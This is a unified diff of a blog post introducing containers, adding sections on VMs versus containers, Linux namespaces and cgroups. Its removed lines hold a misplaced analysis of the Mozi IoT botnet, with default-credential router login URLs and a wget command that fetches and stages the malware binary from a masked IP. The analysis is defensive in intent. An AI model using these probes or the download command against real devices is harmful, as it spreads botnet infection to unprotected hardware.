@@ -14,8 +14,9 @@
 <meta property="og:description" content="What are Containers?Containers are something like a virtual machine, it has its operating system and all, except that unlike virtual machines they don’t simulate the entire computer, but rather create">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://0x11e48b5.github.io/introduction-to-containers/what-is-container-1.png">
+<meta property="og:image" content="https://0x11e48b5.github.io/introduction-to-containers/container-vs-vms.png">
 <meta property="article:published_time" content="2025-02-11T12:39:12.000Z">
-<meta property="article:modified_time" content="2025-02-11T08:51:31.919Z">
+<meta property="article:modified_time" content="2025-02-13T13:28:20.847Z">
 <meta property="article:author" content="11E48B5">
 <meta property="article:tag" content="devops">
 <meta property="article:tag" content="docker">
@@ -117,7 +118,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-Containers"><span class="toc-number">1.</span> <span class="toc-text">What are Containers?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-do-we-need-containers"><span class="toc-number">1.1.</span> <span class="toc-text">Why do we need containers?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-Mozi-Malware-Works-Technical-Details"><span class="toc-number">1.2.</span> <span class="toc-text">How Mozi Malware Works? (Technical Details)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technical-Mitigation-Strategies"><span class="toc-number">1.3.</span> <span class="toc-text">Technical Mitigation Strategies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention"><span class="toc-number">1.3.1.</span> <span class="toc-text">Prevention</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-Containers"><span class="toc-number">1.</span> <span class="toc-text">What are Containers?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-do-we-need-containers"><span class="toc-number">1.1.</span> <span class="toc-text">Why do we need containers?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Key-Reasons-for-Using-Containers"><span class="toc-number">1.1.1.</span> <span class="toc-text">Key Reasons for Using Containers</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Difference-between-VMs-and-Containers"><span class="toc-number">1.2.</span> <span class="toc-text">Difference between VMs and Containers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-namespaces-and-importance-of-it-in-containers"><span class="toc-number">1.3.</span> <span class="toc-text">What is namespaces and importance of it in containers?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Cgroups"><span class="toc-number">1.4.</span> <span class="toc-text">What is Cgroups</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -165,41 +166,118 @@
     <h1 id="What-are-Containers"><a href="#What-are-Containers" class="headerlink" title="What are Containers?"></a>What are Containers?</h1><p>Containers are something like a virtual machine, it has its operating system and all, except that unlike virtual machines <code>they don’t simulate the entire computer</code>, but rather create a sand boxed environment that pretends to be a virtual machine. Another defination for that; Containers provide a way of creating an isolated environment, sometimes called a sandbox, in which applications and their dependencies can live.</p>
 <img src="/introduction-to-containers/what-is-container-1.png" class="">
 
-<h2 id="Why-do-we-need-containers"><a href="#Why-do-we-need-containers" class="headerlink" title="Why do we need containers?"></a>Why do we need containers?</h2><p>Why do we need this technology? In order to answer that question, we should know the difference between VMs and Containers.</p>
-<h2 id="How-Mozi-Malware-Works-Technical-Details"><a href="#How-Mozi-Malware-Works-Technical-Details" class="headerlink" title="How Mozi Malware Works? (Technical Details)"></a>How Mozi Malware Works? (Technical Details)</h2><p>What if we download mozi malware from urlhaus or threatfox, you can see the type of this malwares mostly <code>ELF 32-bit MSB executable, MIPS, MIPS-I version 1</code> or <code>ARM</code> version of this. They gets downloaded from random node who already infected in botnet network. One infected Mozi bot (maybe router or camera) scans the network to find possible victims by sending HTTP requests to comman urls that used from possible IoT devices. Maybe it searchs for vulnerabilities that gives power to comprimise the device. Patterns for HTTP request that made from Mozi bot are that;</p>
+<h2 id="Why-do-we-need-containers"><a href="#Why-do-we-need-containers" class="headerlink" title="Why do we need containers?"></a>Why do we need containers?</h2><p>Containers are essential in IT because they provide a lightweight, portable, and efficient way to package, deploy, and run applications across different environments. They help developers and IT teams streamline software deployment, improve scalability, and enhance security.</p>
+<h3 id="Key-Reasons-for-Using-Containers"><a href="#Key-Reasons-for-Using-Containers" class="headerlink" title="Key Reasons for Using Containers"></a>Key Reasons for Using Containers</h3><ol>
+<li>Portability<br>Containers bundle an application and its dependencies into a single unit. This ensures that the application runs consistently <code>across different</code> environments (development, testing, production) without compatibility issues.</li>
+</ol>
+<p>💡 Example: A developer can build an application on their laptop using Docker and deploy the same container to a cloud server <code>without modifications</code>.</p>
+<ol start="2">
+<li>Lightweight and Efficient<br>Unlike traditional virtual machines (VMs), containers <code>share the same OS kernel</code> but run in isolated user spaces. This makes them:</li>
+</ol>
 <ul>
-<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;user&amp;psd&#x3D;user</li>
-<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;admin&amp;psd&#x3D;admin</li>
-<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;adminisp&amp;psd&#x3D;adminisp</li>
-<li>&#x2F;boaform&#x2F;admin&#x2F;formLogin?username&#x3D;ec8&amp;psd&#x3D;ec8</li>
+<li>Faster to start</li>
+<li>Less resource-intensive</li>
+<li>More efficient in scaling applications</li>
 </ul>
-<p>If it can access possible victim using this credantials, it trys to download Mozi malware itself using <code>wget</code> command that is a powerful utility for non-interactive downloading of files from the web. The comman pattern to test victim is vulnerable for CMDi attacks for delivering malware is that <code>wget http://xxx.xx.xxx.xxx/bins/mozi.a -o /var/tmp/mozi.a; chmod 777 /var/tmp/mozi.a; rm -rf /var/tmp/mozi.a</code></p>
-<p>After that malware gets downloaded and executed. Once executed, the <code>binary forks</code> many versions of itself renamed as ‘ssh’ or ‘dropbear’. The forked processes are responsible for setting up the DHT communications and closing ports to prevent infection by other malware. The forked processes can also set up HTTP on a randomly chosen port to host the Mozi binary.</p>
+<p>💡 Example: A VM might require 2GB of RAM to run a simple web app, while a containerized version could use just 500MB.</p>
+<ol start="3">
+<li>Scalability and Microservices Architecture<br>Containers make it easier to <code>scale applications</code> by running multiple instances dynamically. They also support microservices architecture, where different parts of an application run in separate containers.</li>
+</ol>
+<p>💡 Example: A web application might have separate containers for the frontend, backend API, and database, each scaling independently as needed.</p>
+<ol start="4">
+<li>Isolation and Security<br>Each container runs in its own isolated environment, reducing the risk of conflicts between applications and improving security.</li>
+</ol>
+<p>💡 Example: If one container is compromised, the attack is contained and does not affect the host system or other containers.</p>
+<p>Why do we need this technology? In order to answer that question, we should know the difference between VMs and Containers.</p>
+<h2 id="Difference-between-VMs-and-Containers"><a href="#Difference-between-VMs-and-Containers" class="headerlink" title="Difference between VMs and Containers"></a>Difference between VMs and Containers</h2><p>Both Virtual Machines (VMs) and Containers enable application deployment in isolated environments, but they differ in architecture, efficiency, and use cases.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Feature</strong></th>
+<th><strong>Virtual Machines (VMs)</strong></th>
+<th><strong>Containers</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Isolation</strong></td>
+<td>Fully isolated, runs its own OS</td>
+<td>Process-level isolation, shares host OS kernel</td>
+</tr>
+<tr>
+<td><strong>Size</strong></td>
+<td>Large (GBs), includes OS</td>
+<td>Lightweight (MBs), shares OS dependencies</td>
+</tr>
+<tr>
+<td><strong>Startup Time</strong></td>
+<td>Slow (minutes)</td>
+<td>Fast (seconds)</td>
+</tr>
+<tr>
+<td><strong>Resource Usage</strong></td>
+<td>High (each VM runs a full OS)</td>
+<td>Low (shares OS, minimal overhead)</td>
+</tr>
+<tr>
+<td><strong>Performance</strong></td>
+<td>Lower (due to full OS emulation)</td>
+<td>Higher (less overhead)</td>
+</tr>
+<tr>
+<td><strong>Portability</strong></td>
+<td>Less portable, tied to hypervisor</td>
+<td>Highly portable, runs consistently across environments</td>
+</tr>
+<tr>
+<td><strong>Security</strong></td>
+<td>Stronger isolation (separate OS)</td>
+<td>Less isolated but can be hardened</td>
+</tr>
+<tr>
+<td><strong>Use Case</strong></td>
+<td>Running multiple OSes, legacy applications, full VM environments</td>
+<td>Microservices, cloud-native apps, fast deployments</td>
+</tr>
+</tbody></table>
+<ol>
+<li>Architecture<br>VMs run on a hypervisor, which creates virtual hardware for each VM, requiring a separate OS instance.<br>Containers share the host OS kernel, isolating applications but using fewer resources.</li>
+</ol>
+<p>💡 Example: Running 10 VMs requires 10 OS instances, while running 10 containers only requires one OS.</p>
+<ol start="2">
+<li>Performance &amp; Efficiency<br>VMs have higher overhead due to the need for a full OS and virtualized hardware.<br>Containers are lightweight because they only package applications and necessary dependencies.</li>
+</ol>
+<p>💡 Example: A VM may need 2GB RAM, while a container running the same app might need only 200MB.</p>
+<ol start="3">
+<li>Deployment &amp; Scalability<br>VMs take longer to start since they boot an entire OS.<br>Containers start almost instantly, making them ideal for scaling applications dynamically.</li>
+</ol>
+<p>💡 Example: A cloud service can deploy 100 container instances in seconds, whereas booting 100 VMs would take much longer.</p>
+<p>Here is the picture that shows the difference between VM and Container technology</p>
+<img src="/introduction-to-containers/container-vs-vms.png" class="">
 
-
-<h2 id="Technical-Mitigation-Strategies"><a href="#Technical-Mitigation-Strategies" class="headerlink" title="Technical Mitigation Strategies"></a>Technical Mitigation Strategies</h2><p>To effectively protect against <code>Mozi</code> malware, you can follow below advices. Here are detailed technical advices:</p>
-<h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h3><ul>
-<li>Strengthen Authentication:<ul>
-<li>Enforce strong, unique passwords for all IoT devices. Avoid using default credentials.</li>
-<li>Implement multi-factor authentication (MFA) where possible.</li>
+<h2 id="What-is-namespaces-and-importance-of-it-in-containers"><a href="#What-is-namespaces-and-importance-of-it-in-containers" class="headerlink" title="What is namespaces and importance of it in containers?"></a>What is namespaces and importance of it in containers?</h2><p>Namespace is a feature in Linux that lets you see a specific part of the system, meaning allocating resources in an isolated environment. Namespace allows you to create that isolated environment where the container only knows what it can see because it’s only in a certain namespace.</p>
+<p>When you initialize a container, docker generates a set of namespaces for the container and every container has its own unique set of namespaces.</p>
+<p>The purpose of each namespace is to wrap a particular global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource. One of the overall goals of namespaces is to support the implementation of containers, a tool for lightweight virtualization (as well as other purposes) that provides a group of processes with the illusion that they are the only processes on the system” — <a target="_blank" rel="noopener" href="https://lwn.net/Articles/531114/">https://lwn.net/Articles/531114/</a></p>
+<p>Container engines use several namespaces, including:</p>
+<ul>
+<li><strong>PID</strong> — Isolation of the pids allocation and list of processes, allowing containers to have their own process tree.</li>
+<li><strong>NET</strong> — Isolation of network-related resources like network interfaces, iptables, and firewall rules.</li>
+<li><strong>IPC</strong> — Isolation of the Inter-Process Communication resources.</li>
+<li><strong>MNT</strong> — Managing mount points. Allows containers to have their own mount points and thus their own filesystems.</li>
+<li><strong>UTS</strong> — Isolation of host and domain names. Allows containers to believe they’re running on differently named servers.</li>
 </ul>
-</li>
-<li>Firmware and Software Updates:<ul>
-<li>Regularly update firmware and software on all IoT devices to patch known vulnerabilities.</li>
-<li>Enable automatic updates if the option is available.</li>
+<h2 id="What-is-Cgroups"><a href="#What-is-Cgroups" class="headerlink" title="What is Cgroups"></a>What is Cgroups</h2><p>Cgroups are another essential feature for containers. A cgroup is a Linux kernel feature (since v2.6.24) that limits, accounts for, and isolates resource usage (CPU, memory, disk I&#x2F;O, etc.) for a group of processes. You can think of them as traffic cops for your programs that make sure no one takes or uses too much resources. Cgroups enable sharing the available hardware resources with containers and enforce usage limits.</p>
+<p>Container engines use the following cgroups:</p>
+<ul>
+<li>Memory — Managing memory allocation and usage.</li>
+<li>HugeTBL — Accounting usage of huge pages by a process group.</li>
+<li>CPU — Managing CPU time and usage.</li>
+<li>CPUSet — Binding a group of processes to specific CPUs.</li>
+<li>BlkIO — Measuring and limiting the amount of I&#x2F;O operations by group.</li>
+<li>net_cls and net_prio — Classifying and assigning network priorities to the traffic for traffic control.</li>
+<li>Devices — Managing read&#x2F;write access devices.</li>
+<li>Freezer — Freezing a group. Useful for checkpointing (saving the state of a process) and migration.</li>
 </ul>
-</li>
-<li>Network Segmentation:<ul>
-<li>Isolate IoT devices from critical network segments to limit the impact of a potential compromise.</li>
-<li>Use VLANs (Virtual Local Area Networks) and firewalls to control traffic between network segments.</li>
-</ul>
-</li>
-<li>Disable Unnecessary Services:<ul>
-<li>Turn off unused services and protocols on IoT devices to reduce attack surfaces.</li>
-</ul>
-</li>
-</ul>
-<p>See you in next blog.</p>
+<p>With namespaces and cgroups, containers operate within well-defined boundaries (scope and resource wise), unable to influence or access what lies beyond their view.</p>
 
   </div>
 </article>
@@ -227,7 +305,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-Containers"><span class="toc-number">1.</span> <span class="toc-text">What are Containers?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-do-we-need-containers"><span class="toc-number">1.1.</span> <span class="toc-text">Why do we need containers?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-Mozi-Malware-Works-Technical-Details"><span class="toc-number">1.2.</span> <span class="toc-text">How Mozi Malware Works? (Technical Details)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technical-Mitigation-Strategies"><span class="toc-number">1.3.</span> <span class="toc-text">Technical Mitigation Strategies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prevention"><span class="toc-number">1.3.1.</span> <span class="toc-text">Prevention</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-Containers"><span class="toc-number">1.</span> <span class="toc-text">What are Containers?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-do-we-need-containers"><span class="toc-number">1.1.</span> <span class="toc-text">Why do we need containers?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Key-Reasons-for-Using-Containers"><span class="toc-number">1.1.1.</span> <span class="toc-text">Key Reasons for Using Containers</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Difference-between-VMs-and-Containers"><span class="toc-number">1.2.</span> <span class="toc-text">Difference between VMs and Containers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-namespaces-and-importance-of-it-in-containers"><span class="toc-number">1.3.</span> <span class="toc-text">What is namespaces and importance of it in containers?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-Cgroups"><span class="toc-number">1.4.</span> <span class="toc-text">What is Cgroups</span></a></li></ol></li></ol>
       </div>
     
 
